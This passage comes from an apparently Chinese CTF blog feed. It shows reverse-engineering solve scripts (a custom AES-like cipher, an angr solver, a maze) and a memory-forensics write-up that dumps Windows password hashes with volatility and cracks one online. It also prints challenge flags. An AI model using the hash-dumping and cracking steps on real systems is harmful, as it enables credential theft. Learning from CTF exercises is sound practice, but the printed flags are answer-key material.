class="line">a[<span class="number">4</span>*j+i] = table[idx]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span>(<span class="params">a</span>):</span></span><br><span class="line">a[<span class="number">1</span>], a[<span class="number">5</span>], a[<span class="number">9</span>], a[<span class="number">13</span>] = a[<span class="number">5</span>], a[<span class="number">9</span>], a[<span class="number">13</span>], a[<span class="number">1</span>]</span><br><span class="line">a[<span class="number">2</span>], a[<span class="number">10</span>] = a[<span class="number">10</span>], a[<span class="number">2</span>]</span><br><span class="line">a[<span class="number">6</span>], a[<span class="number">14</span>] = a[<span class="number">14</span>], a[<span class="number">6</span>]</span><br><span class="line">a[<span class="number">3</span>], a[<span class="number">15</span>], a[<span class="number">11</span>], a[<span class="number">7</span>] = a[<span class="number">15</span>], a[<span class="number">11</span>], a[<span class="number">7</span>], a[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">func = <span class="keyword">lambda</span> a : ((<span class="number">27</span> * ((a &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>)) ^ (<span class="number">2</span> * a)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal</span>(<span class="params">a</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">t1 = a[<span class="number">4</span>*i]</span><br><span class="line">t2 = a[<span class="number">4</span>*i+<span class="number">3</span>] ^ a[<span class="number">4</span>*i+<span class="number">2</span>] ^ a[<span class="number">4</span>*i+<span class="number">1</span>] ^ t1</span><br><span class="line">a[<span class="number">4</span>*i] = t2 ^ func(a[<span class="number">4</span>*i+<span class="number">1</span>] ^ t1) ^ t1</span><br><span class="line">a[<span class="number">4</span>*i+<span class="number">1</span>] ^= t2 ^ func(a[<span class="number">4</span>*i+<span class="number">2</span>] ^ a[<span class="number">4</span>*i+<span class="number">1</span>])</span><br><span class="line">a[<span class="number">4</span>*i+<span class="number">2</span>] ^= t2 ^ func(a[<span class="number">4</span>*i+<span class="number">3</span>] ^ a[<span class="number">4</span>*i+<span class="number">2</span>])</span><br><span class="line">a[<span class="number">4</span>*i+<span class="number">3</span>] ^= t2 ^ func(t1 ^ a[<span class="number">4</span>*i+<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plain</span>):</span></span><br><span class="line">plain = <span class="built_in">map</span>(<span class="built_in">ord</span>, plain)</span><br><span class="line">v4 = <span class="built_in">range</span>(<span class="number">16</span>)</span><br><span class="line">cipher = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">64</span>, <span class="number">16</span>):</span><br><span class="line">inp = plain[i:]</span><br><span class="line">xor(<span class="number">0</span>, inp, v4)</span><br><span class="line">xor(<span class="number">0</span>, inp, const_key)</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">find_table(inp)</span><br><span class="line">swap(inp)</span><br><span class="line"><span class="keyword">if</span> j == <span class="number">14</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">deal(inp)</span><br><span class="line">xor(j, inp, const_key)</span><br><span class="line">j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">xor(<span class="number">0xE</span>, inp, const_key)</span><br><span class="line">v4 = inp[:<span class="number">16</span>]</span><br><span class="line">cipher += v4</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>(<span class="built_in">hex</span>, cipher)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> encrypt(<span class="string">&#x27;a&#x27;</span> * <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>所以对应写个解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;91 B3 C1 EB 14 5D D5 CE 3A 1D 30 E4 70 6C 6B D7 69 78 79 02 A3 A5 DF 1B FD 1C 02 89 14 20 7A FD 24 52 F8 A9 F9 F1 6B 1C 0F 5D 50 5B EC 42 D1 8C B8 12 CF 2C A9 69 31 46 FD 9B EA DE C8 BF 94 69&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line">const_key = <span class="string">&quot;43 72 79 70 74 6F 46 41 49 4C 55 52 45 66 6F 72 52 53 41 32 30 34 38 4B 65 79 21 21 21 21 21 21 BF 8F 84 8D CB E0 C2 CC 82 AC 97 9E C7 CA F8 EC 94 27 00 FC A4 13 38 B7 C1 6A 19 96 E0 4B 38 B7 0E 88 2D 6C C5 68 EF A0 47 C4 78 3E 80 0E 80 D2 59 8C CD 49 FD 9F F5 FE 3C F5 EC 68 DC BE D4 DF A4 C0 B3 EA 61 A8 5C 4A 26 6C 24 74 A6 62 A4 A6 7D 26 84 6D 80 B9 71 93 BC 4C 9D FB 60 F2 49 24 25 FB 85 3A 44 53 D9 70 62 3F FD 04 C4 5D 59 A2 61 6A 4F 57 E1 D3 3E C4 5D 9F A3 3F 3D 6D EA 1B 09 7C 2A 1D 4D 2F F3 6D 2F 10 0E 69 EB 4D 57 CB 88 89 14 48 69 5A 2A 8C 34 C5 89 B3 09 A8 63 A8 EB 87 E8 1C A6 A8 1B 71 89 B8 15 18 62 F5 42 D3 22 6F 38 2E 4B 35 12 A2 7F F0 9B 11 76 58 F8 B9 C1 C6 BE 24 67 6E A5 55 EE D6 B0 4D 8C 23 F2 9E&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">const_key = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> const_key]</span><br><span class="line">table = <span class="string">&quot;63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0 B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15 04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75 09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84 53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8 51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2 CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73 60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79 E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08 BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A 70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF 8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">table = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">n, a, b</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">a[<span class="number">4</span>*i+j] ^= b[<span class="number">16</span>*n+<span class="number">4</span>*i+j]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_swap</span>(<span class="params">a</span>):</span></span><br><span class="line">a[<span class="number">5</span>], a[<span class="number">9</span>], a[<span class="number">13</span>], a[<span class="number">1</span>] = a[<span class="number">1</span>], a[<span class="number">5</span>], a[<span class="number">9</span>], a[<span class="number">13</span>]</span><br><span class="line">a[<span class="number">2</span>], a[<span class="number">10</span>] = a[<span class="number">10</span>], a[<span class="number">2</span>]</span><br><span class="line">a[<span class="number">6</span>], a[<span class="number">14</span>] = a[<span class="number">14</span>], a[<span class="number">6</span>]</span><br><span class="line">a[<span class="number">15</span>], a[<span class="number">11</span>], a[<span class="number">7</span>], a[<span class="number">3</span>] = a[<span class="number">3</span>], a[<span class="number">15</span>], a[<span class="number">11</span>], a[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_find_table</span>(<span class="params">a</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">idx = table.index(a[<span class="number">4</span>*j+i])</span><br><span class="line">a[<span class="number">4</span>*j+i] = idx</span><br><span class="line"></span><br><span class="line">func = <span class="keyword">lambda</span> a : ((<span class="number">27</span> * ((a &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>)) ^ (<span class="number">2</span> * a)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">if</span> i ^ func(i) == x:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_f</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">if</span> func(i) == x:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re</span>(<span class="params">x</span>):</span></span><br><span class="line">t01 = x[<span class="number">0</span>] ^ x[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">eq = t01 ^ func(i)</span><br><span class="line">old01 = solve(eq)</span><br><span class="line">old02 = old01 ^ i</span><br><span class="line">t02 = x[<span class="number">0</span>] ^ x[<span class="number">2</span>]</span><br><span class="line">old23 = solve_f(t02 ^ old02 ^ func(old01))</span><br><span class="line">old03 = old02 ^ old23</span><br><span class="line">a2 = x[<span class="number">3</span>] ^ func(old03) ^ old01</span><br><span class="line">a3 = old23 ^ a2</span><br><span class="line">a0 = old02 ^ a2</span><br><span class="line">a1 = old01 ^ a0</span><br><span class="line"><span class="keyword">if</span>(x[<span class="number">0</span>] == a1 ^ a2 ^ a3 ^ func(a0 ^ a1)</span><br><span class="line"><span class="keyword">and</span> x[<span class="number">1</span>] == a0 ^ a2 ^ a3 ^ func(a2 ^ a1)</span><br><span class="line"><span class="keyword">and</span> x[<span class="number">2</span>] == a1 ^ a0 ^ a3 ^ func(a2 ^ a3)</span><br><span class="line"><span class="keyword">and</span> x[<span class="number">3</span>] == a1 ^ a2 ^ a0 ^ func(a3 ^ a0)):</span><br><span class="line"><span class="keyword">return</span> [a0, a1, a2, a3]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d_deal</span>(<span class="params">a</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">ori = re(a[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)])</span><br><span class="line">a[<span class="number">4</span>*i] = ori[<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>*i+<span class="number">1</span>] = ori[<span class="number">1</span>]</span><br><span class="line">a[<span class="number">4</span>*i+<span class="number">2</span>] = ori[<span class="number">2</span>]</span><br><span class="line">a[<span class="number">4</span>*i+<span class="number">3</span>] = ori[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher</span>):</span></span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, -<span class="number">1</span>, -<span class="number">16</span>):</span><br><span class="line">inp = cipher[i:i+<span class="number">16</span>]</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">v4 = <span class="built_in">range</span>(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">v4 = cipher[i-<span class="number">16</span>:i]</span><br><span class="line">xor(<span class="number">0xE</span>, inp, const_key)</span><br><span class="line"></span><br><span class="line">d_swap(inp)</span><br><span class="line">d_find_table(inp)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">xor(j, inp, const_key)</span><br><span class="line">d_deal(inp)</span><br><span class="line">d_swap(inp)</span><br><span class="line">d_find_table(inp)</span><br><span class="line">xor(<span class="number">0</span>, inp, const_key)</span><br><span class="line">xor(<span class="number">0</span>, inp, v4)</span><br><span class="line">plain = inp + plain</span><br><span class="line"><span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line">flag = decrypt(target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag)))</span><br><span class="line"><span class="comment"># hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span></span><br></pre></td></tr></table></figure><p>直接用 AES 库的话：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">text</span>):</span></span><br><span class="line">key = <span class="string">b&quot;CryptoFAILUREforRSA2048Key!!!!!!&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f&quot;</span></span><br><span class="line"></span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">cryptor = AES.new(key, mode, iv)</span><br><span class="line">plain_text = cryptor.decrypt(a2b_hex(text))</span><br><span class="line"><span class="keyword">return</span> plain_text.decode()</span><br><span class="line"></span><br><span class="line">raw = <span class="string">&quot;91 B3 C1 EB 14 5D D5 CE 3A 1D 30 E4 70 6C 6B D7 69 78 79 02 A3 A5 DF 1B FD 1C 02 89 14 20 7A FD 24 52 F8 A9 F9 F1 6B 1C 0F 5D 50 5B EC 42 D1 8C B8 12 CF 2C A9 69 31 46 FD 9B EA DE C8 BF 94 69&quot;</span></span><br><span class="line">target = raw.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(decrypt(target))</span><br><span class="line"><span class="comment"># hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span></span><br></pre></td></tr></table></figure><br><h3 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Akira之瞳-1"><a href="#Akira之瞳-1" class="headerlink" title="Akira之瞳-1"></a>Akira之瞳-1</h4><blockquote><p>分值：350pts</p><p>描述：有人想问 Akira 为什么总喜欢用眼睛当头像，Akira 说：“我给你讲个故事吧，从前有一天一位原画师在上班，不幸的是突然起了火灾，情急之下 IT 部门把她没保存的工作 dump 了下来并传到了网上 …… ”</p></blockquote><p><code>volatility -f important_work.raw imageinfo</code>，选择 <code>Win7SP1x64</code> 作为 profile 参数</p><p><code>volatility -f important_work.raw --profile=Win7SP1x64 pslist</code>，得知 important_work 进程的 pid 为 1092</p><p><code>volatility -f important_work.raw --profile=Win7SP1x64 memdump -p 1092 -D .</code>，得到 1092.dmp</p><p><code>foremost 1092.dmp</code>，得到压缩包 <code>00002256.zip</code>，压缩包备注里提示 <code>Password is sha256(login_password)</code></p><p>获取压缩包密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># volatility -f important_work.raw --profile=Win7SP1x64 hashdump</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Genga03:1001:aad3b435b51404eeaad3b435b51404ee:84b0d9c9f830238933e7131d60ac6436:::</span><br></pre></td></tr></table></figure><p>拿 <code>84b0d9c9f830238933e7131d60ac6436</code> 去 cmd5 查，得到密码 asdqwe123，sha256 一下得到压缩包密码</p><p>压缩包里两张一样的图，很明显的盲水印，用 <a href="https://github.com/chishaxie/BlindWaterMark">github</a> 的脚本解一下得到含有 flag 的图片（需要放大仔细看），<code>hgame&#123;7he_f1ame_brin9s_me_end1ess_9rief&#125;</code></p><br><h4 id="Akira之瞳-2"><a href="#Akira之瞳-2" class="headerlink" title="Akira之瞳-2"></a>Akira之瞳-2</h4><blockquote><p>分值：400pts</p><p>描述：</p><p>​    ……<br>​    “最后呢？”<br>​    “最后她还是没能幸免，人们在保险箱旁发现了她烧焦的尸体，打开保险箱人们发现了一个U盘，是她将回家画好的原稿带来时用的 ……”</p></blockquote><p>👴懒得做了，和第二名差的分一道题补不回来，寄！</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj 逆向刷题之旅（三）</title>
      <link href="/2021/02/03/buuoj-%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2021/02/03/buuoj-%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>以下是本文涉及到的关键词：</p><ul><li>架构：x86, mips, JVM</li><li>文件类型：exe, elf, apk</li><li>考点：angr, maze, base64, .NET, Unity游戏, sm4, rc4, 混淆, SMC, upx</li></ul><p>PS. 用到的 python 脚本运行环境<strong>除特殊标注外均为 python2</strong>，<strong>如果内容有误或者图片缺失，欢迎联系我修正</strong>。</p><iframe frameborder="0" border="1"    marginwidth="0" marginheight="0"    width=100% height=105    src="//music.163.com/outchain/player?type=2&id=414826862&auto=0&height=60"></iframe><br><h3 id="FlareOn2-very-success-x86-exe-angr"><a href="#FlareOn2-very-success-x86-exe-angr" class="headerlink" title="[FlareOn2]very_success | x86,exe,angr"></a>[FlareOn2]very_success | x86,exe,angr</h3><p>ida 打开，start 直接调用了 sub_401000，判断程序应该是用汇编写的。sub_401000 由于栈不平衡反编译失败，打开栈指针，在导致分析错误的一行 Alt + k，将 sp 值设置为 0：</p><p><img src="../img/FlareOn2very_success/1.png" alt="FlareOn2very_success"></p><p>再 F5：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall sub_401000@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE stdin; <span class="comment">// ST1C_4</span></span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  HANDLE stdout; <span class="comment">// [esp-Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp-8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> retaddr; <span class="comment">// [esp+0h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  stdin = <span class="built_in">GetStdHandle</span>(<span class="number">0xFFFFFFF6</span>);</span><br><span class="line">  stdout = <span class="built_in">GetStdHandle</span>(<span class="number">0xFFFFFFF5</span>);</span><br><span class="line">  <span class="built_in">WriteFile</span>(stdout, aYouCrushedThat, <span class="number">0x43</span>u, (LPDWORD)&amp;v4, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">ReadFile</span>(stdin, &amp;input, <span class="number">0x32</span>u, (LPDWORD)&amp;v4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401084</span>((<span class="keyword">int</span>)&amp;v4, retaddr, (<span class="keyword">char</span> *)&amp;input, v4) )</span><br><span class="line">    result = <span class="built_in">WriteFile</span>(stdout, aYouAreSuccess, <span class="number">0x11</span>u, (LPDWORD)&amp;v4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">WriteFile</span>(stdout, aYouAreFailure, <span class="number">0x11</span>u, (LPDWORD)&amp;v4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有一个检验函数 sub_401084，这个函数的汇编指令里 5 个我有 4 个不认识（我很骄傲）。动调后发现检查的思路是每次取来输入的一个字符（输入有 37 个字符），经过一堆运算后，倒着从 0x401108 开始向低地址逐一比较。正好 start 函数的 <code>call sub_401000</code> 下面有 37 个字节：</p><p><img src="../img/FlareOn2very_success/2.png" alt="FlareOn2very_success"></p><p>具体咋算的我也不想弄明白了，上 angr 跑吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;very_success&quot;</span>, auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state = project.factory.blank_state(addr = <span class="number">0x4010A2</span>)</span><br><span class="line">flag = claripy.BVS(<span class="string">&quot;flag&quot;</span>, <span class="number">8</span> * <span class="number">37</span>)</span><br><span class="line">inputAddr = <span class="number">0x402159</span></span><br><span class="line">state.memory.store(inputAddr, flag)</span><br><span class="line">state.regs.ebx = <span class="number">0</span></span><br><span class="line">state.regs.ecx = <span class="number">37</span></span><br><span class="line">state.regs.esi = inputAddr</span><br><span class="line">state.regs.edi = <span class="number">0x401108</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag.chop(<span class="number">8</span>):</span><br><span class="line">state.solver.add(state.solver.And(c &lt;= <span class="string">&#x27;~&#x27;</span>, c &gt;= <span class="string">&#x27; &#x27;</span>))</span><br><span class="line"></span><br><span class="line">sm = project.factory.simulation_manager(state)</span><br><span class="line">sm.explore(find = <span class="number">0x4010D5</span>)</span><br><span class="line"></span><br><span class="line">solution = sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag, cast_to = <span class="built_in">bytes</span>)</span><br><span class="line"><span class="built_in">print</span>(solution.decode())</span><br></pre></td></tr></table></figure><br><h3 id="SCTF2019-babyre-x86-elf-maze-base64-sm4"><a href="#SCTF2019-babyre-x86-elf-maze-base64-sm4" class="headerlink" title="[SCTF2019]babyre | x86,elf,maze,base64,sm4"></a>[SCTF2019]babyre | x86,elf,maze,base64,sm4</h3><p>main 函数有几处花指令，把它们 nop 掉以后反编译。逻辑很清晰，一共有三关，分别是：</p><ul><li>5 * 5 * 5 的三维迷宫</li><li>将输入 base64 解码，得到的结果应该是 sctf_9102</li><li>对输入进行类似 sm4 加密算法的<strong>编码</strong>，结果与目标数组比较</li></ul><p>三维迷宫提取出来：</p><p><img src="../img/SCTF2019babyre/1.png" alt="SCTF2019babyre"></p><p>每层 5 * 5，共 5 层，入口在 s，出口在 #，. 可以通行，* 不能通行。每次行动有 6 个方向可选，同一层内：上(w)、下(s)、左(a)、右(d)，不同层间：下一层(x)、上一层(y)。走出来最短路径为 <code>ddwwxxssxaxwwaasasyywwdd</code></p><p>第二个部分的输入应为 base64(“sctf_9102”) = <code>c2N0Zl85MTAy</code></p><p>第三个部分需要分析 sub_400FFA，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&quot;D6 90 E9 FE CC E1 3D B7 16 B6 14 C2 28 FB 2C 05 2B 67 9A 76 2A BE 04 C3 AA 44 13 26 49 86 06 99 9C 42 50 F4 91 EF 98 7A 33 54 0B 43 ED CF AC 62 E4 B3 1C A9 C9 08 E8 95 80 DF 94 FA 75 8F 3F A6 47 07 A7 FC F3 73 17 BA 83 59 3C 19 E6 85 4F A8 68 6B 81 B2 71 64 DA 8B F8 EB 0F 4B 70 56 9D 35 1E 24 0E 5E 63 58 D1 A2 25 22 7C 3B 01 21 78 87 D4 00 46 57 9F D3 27 52 4C 36 02 E7 A0 C4 C8 9E EA BF 8A D2 40 C7 38 B5 A3 F7 F2 CE F9 61 15 A1 E0 AE 5D A4 9B 34 1A 55 AD 93 32 